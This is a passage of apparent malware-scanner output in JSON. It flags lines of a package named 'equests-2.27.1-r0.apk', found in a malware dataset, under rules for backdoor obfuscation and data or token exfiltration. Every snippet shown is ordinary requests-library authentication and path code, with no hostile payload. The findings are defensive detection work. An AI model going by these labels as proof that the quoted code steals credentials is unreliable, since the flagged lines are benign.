                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 5,
                  "endLine": 253,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        # this is already a valid path, no need to do anything further\n        return path\n\n    # find the first valid part of the provided path and treat that as a zip archive\n    # assume the rest of the path is the name of a member in the archive\n    archive, member = os.path.split(path)\n    while archive and not os.path.exists(archive):\n",
                    "rendered": {
                      "text": "        # this is already a valid path, no need to do anything further\n        return path\n\n    # find the first valid part of the provided path and treat that as a zip archive\n    # assume the rest of the path is the name of a member in the archive\n    archive, member = os.path.split(path)\n    while archive and not os.path.exists(archive):\n",
                      "markdown": "`        # this is already a valid path, no need to do anything further\n        return path\n\n    # find the first valid part of the provided path and treat that as a zip archive\n    # assume the rest of the path is the name of a member in the archive\n    archive, member = os.path.split(path)\n    while archive and not os.path.exists(archive):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 5,
                  "endLine": 17,
                  "endColumn": 11,
                  "snippet": {
                    "text": "import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n",
                    "rendered": {
                      "text": "import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n",
                      "markdown": "`import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 26,
                  "endLine": 251,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            # Rewind the file position indicator of the body to where\n            # it was to resend the request.\n            r.request.body.seek(self._thread_local.pos)\n        s_auth = r.headers.get('www-authenticate', '')\n\n        if 'digest' in s_auth.lower() and self._thread_local.num_401_calls < 2:\n\n",
                    "rendered": {
                      "text": "            # Rewind the file position indicator of the body to where\n            # it was to resend the request.\n            r.request.body.seek(self._thread_local.pos)\n        s_auth = r.headers.get('www-authenticate', '')\n\n        if 'digest' in s_auth.lower() and self._thread_local.num_401_calls < 2:\n\n",
                      "markdown": "`            # Rewind the file position indicator of the body to where\n            # it was to resend the request.\n            r.request.body.seek(self._thread_local.pos)\n        s_auth = r.headers.get('www-authenticate', '')\n\n        if 'digest' in s_auth.lower() and self._thread_local.num_401_calls < 2:\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 136,
                  "startColumn": 40,
                  "endLine": 136,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n        if algorithm is None:\n",
                    "rendered": {
                      "text": "        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n        if algorithm is None:\n",
                      "markdown": "`        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n        if algorithm is None:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 135,
                  "startColumn": 43,
                  "endLine": 135,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n",
                    "rendered": {
                      "text": "        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n",
                      "markdown": "`        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 134,
                  "startColumn": 37,
                  "endLine": 134,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n",
                    "rendered": {
                      "text": "\n        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n",
                      "markdown": "`\n        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 301,
                  "startColumn": 45,
                  "endLine": 301,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                    "rendered": {
                      "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                      "markdown": "`    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 301,
                  "startColumn": 17,
                  "endLine": 301,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                    "rendered": {
                      "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                      "markdown": "`    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 54,
                  "endLine": 182,
                  "endColumn": 62,
                  "snippet": {
                    "text": "        if p_parsed.query:\n            path += '?' + p_parsed.query\n\n        A1 = '%s:%s:%s' % (self.username, realm, self.password)\n        A2 = '%s:%s' % (method, path)\n\n        HA1 = hash_utf8(A1)\n",
                    "rendered": {
                      "text": "        if p_parsed.query:\n            path += '?' + p_parsed.query\n\n        A1 = '%s:%s:%s' % (self.username, realm, self.password)\n        A2 = '%s:%s' % (method, path)\n\n        HA1 = hash_utf8(A1)\n",
                      "markdown": "`        if p_parsed.query:\n            path += '?' + p_parsed.query\n\n        A1 = '%s:%s:%s' % (self.username, realm, self.password)\n        A2 = '%s:%s' % (method, path)\n\n        HA1 = hash_utf8(A1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 24,
                  "endLine": 113,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n",
                    "rendered": {
                      "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n",
                      "markdown": "`\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 13,
                  "endLine": 113,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n",
                    "rendered": {
                      "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n",
                      "markdown": "`\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 111,
                  "startColumn": 33,
                  "endLine": 111,
                  "endColumn": 41,
                  "snippet": {
                    "text": "class HTTPDigestAuth(AuthBase):\n    \"\"\"Attaches HTTP Digest Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n",
                    "rendered": {
                      "text": "class HTTPDigestAuth(AuthBase):\n    \"\"\"Attaches HTTP Digest Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n",
                      "markdown": "`class HTTPDigestAuth(AuthBase):\n    \"\"\"Attaches HTTP Digest Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 104,
                  "startColumn": 79,
                  "endLine": 104,
                  "endColumn": 87,
                  "snippet": {
                    "text": "    \"\"\"Attaches HTTP Proxy Authentication to a given Request object.\"\"\"\n\n    def __call__(self, r):\n        r.headers['Proxy-Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n",
                    "rendered": {
                      "text": "    \"\"\"Attaches HTTP Proxy Authentication to a given Request object.\"\"\"\n\n    def __call__(self, r):\n        r.headers['Proxy-Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n",
                      "markdown": "`    \"\"\"Attaches HTTP Proxy Authentication to a given Request object.\"\"\"\n\n    def __call__(self, r):\n        r.headers['Proxy-Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 73,
                  "endLine": 96,
                  "endColumn": 81,
                  "snippet": {
                    "text": "        return not self == other\n\n    def __call__(self, r):\n        r.headers['Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n",
                    "rendered": {
                      "text": "        return not self == other\n\n    def __call__(self, r):\n        r.headers['Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n",
                      "markdown": "`        return not self == other\n\n    def __call__(self, r):\n        r.headers['Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 45,
                  "endLine": 89,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                    "rendered": {
                      "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                      "markdown": "`    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 17,
                  "endLine": 89,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                    "rendered": {
                      "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                      "markdown": "`    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 24,
                  "endLine": 84,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n",
                    "rendered": {
                      "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n",
                      "markdown": "`\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 13,
                  "endLine": 84,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n",
                    "rendered": {
                      "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n",
                      "markdown": "`\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 82,
                  "startColumn": 33,
                  "endLine": 82,
                  "endColumn": 41,
                  "snippet": {
                    "text": "class HTTPBasicAuth(AuthBase):\n    \"\"\"Attaches HTTP Basic Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n",
                    "rendered": {
                      "text": "class HTTPBasicAuth(AuthBase):\n    \"\"\"Attaches HTTP Basic Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n",
                      "markdown": "`class HTTPBasicAuth(AuthBase):\n    \"\"\"Attaches HTTP Basic Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 39,
                  "endLine": 66,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n    )\n\n    return authstr\n",
                    "rendered": {
                      "text": "        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n    )\n\n    return authstr\n",
                      "markdown": "`        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n    )\n\n    return authstr\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 19,
                  "endLine": 63,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n",
                    "rendered": {
                      "text": "        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n",
                      "markdown": "`        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 8,
                  "endLine": 63,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n",
                    "rendered": {
                      "text": "        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n",
                      "markdown": "`        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 18,
                  "endLine": 62,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    if isinstance(username, str):\n        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n",
                    "rendered": {
                      "text": "    if isinstance(username, str):\n        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n",
                      "markdown": "`    if isinstance(username, str):\n        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 23,
                  "endLine": 56,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n",
                    "rendered": {
                      "text": "            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n",
                      "markdown": "`            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 8,
                  "endLine": 56,
                  "endColumn": 16,
                  "snippet": {
